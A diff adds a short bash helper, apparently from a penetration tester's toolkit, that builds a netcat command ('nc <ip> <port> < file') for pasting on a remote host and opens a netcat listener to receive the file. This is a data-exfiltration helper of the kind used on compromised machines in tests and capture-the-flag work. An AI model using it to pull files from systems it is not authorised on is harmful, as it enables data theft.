@@ -1,0 +1,18 @@
+#!/bin/bash
+source /root/Ops/Commands/colors.sh
+if [ $# -eq 0 ]; then
+  echo "Usage:"
+  echo "transfer_nc [reverse port] [file name].[extension]"
+  exit 1
+fi
+
+IP=$( IP_No_Clip );                      
+New_IP=$( echo -n $IP );
+
+echo -e "${CYAN}Copied client nc syntax to clipboard.";
+
+echo -n "nc $New_IP $1 < $2" | clip;
+
+echo -e "${CYAN}Opening nc listener on port $1.";
+
+nc -lvnp $1 > $2;
